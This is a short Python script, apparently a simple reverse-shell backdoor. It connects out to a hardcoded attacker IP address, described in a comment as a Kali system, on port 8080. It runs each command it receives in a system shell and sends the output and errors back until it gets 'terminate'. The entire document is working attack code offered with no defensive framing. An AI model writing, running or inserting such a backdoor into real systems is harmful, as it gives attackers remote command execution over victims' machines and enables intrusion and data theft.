import socket                                               # For starting TCP connection
import subprocess                                           # To start the shell in the system

# Attacker IP goes here
ATT_IP = "10.254.141.59"

def connect():
    # Creating object soketi
    soketi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # attackers ( kali system ) IP address and port.
    soketi.connect((ATT_IP, 8080))

    while True:                                             # Waiting for commands

        # read the first 1024 KB of the tcp socket
        komandi = soketi.recv(1024)
        if 'terminate' in komandi:                          # Terminate - Break
            soketi.close()
            break

        else:                                               # else pass command to shell.

            CMD = subprocess.Popen(komandi, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            
            soketi.send(CMD.stdout.read())                  # send back the result

            # send back the error -if any-, such as syntax error
            soketi.send(CMD.stderr.read())


if __name__ == "__main__":
    connect()
